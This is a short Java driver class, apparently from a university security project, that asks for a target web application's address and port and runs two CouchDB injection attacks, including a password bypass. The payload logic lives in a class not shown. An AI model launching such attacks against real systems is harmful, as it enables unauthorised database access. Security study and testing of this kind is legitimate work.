package it.org.polito.couchdb;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {

    public static void main(String[] args) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        System.out.println("Insert the url of the web application to attack: ");
        String addr = br.readLine();
        System.out.println("Insert the port number: ");
        String port = br.readLine();
        CouchDBInjection db = new CouchDBInjection("http://" + addr + ":" + port);

        try{
            db.injection161();
        } catch (Exception e){
            System.out.println("Error in attack 161\n");
            System.out.println("Reason:" + e.getMessage() + "\n");
        }
        try{
            db.injection311passwordBypass();
        } catch (Exception e){
            System.out.println("Error in attack 311\n");
            System.out.println("Reason:" + e.getMessage() + "\n");
        }

    }
}